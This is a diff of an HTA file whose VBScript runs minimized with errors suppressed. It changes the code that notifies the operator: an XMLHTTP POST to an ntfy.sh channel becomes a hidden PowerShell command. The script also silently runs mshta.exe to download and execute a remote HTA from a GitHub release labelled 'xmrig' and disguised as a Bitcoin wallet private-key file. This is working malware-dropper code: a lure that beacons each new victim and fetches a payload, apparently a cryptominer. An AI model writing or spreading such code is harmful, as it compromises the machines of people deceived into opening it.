@@ -1,13 +1,9 @@
-
 <html>
 <head>
   <HTA:APPLICATION ID="trigger" WINDOWSTATE="minimize">
   <script language="VBScript">
     On Error Resume Next
-    Set x = CreateObject("MSXML2.XMLHTTP")
-    x.Open "POST", "https://ntfy.sh/dillertus77", False
-    x.setRequestHeader "Content-Type", "text/plain"
-    x.Send "New customer via .lnk & transfer.sh"
+    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command ""Invoke-RestMethod -Uri 'https://ntfy.sh/dillertus77' -Method Post -Body 'New customer via GitHub Pages'""", 0, True
     CreateObject("WScript.Shell").Run "mshta.exe https://github.com/bertammedia/spacetut747/releases/download/xmrig/Bitcoin_Wallet_Privatekey_Balance_2.794_BTC.hta", 0, False
     self.close
   </script>
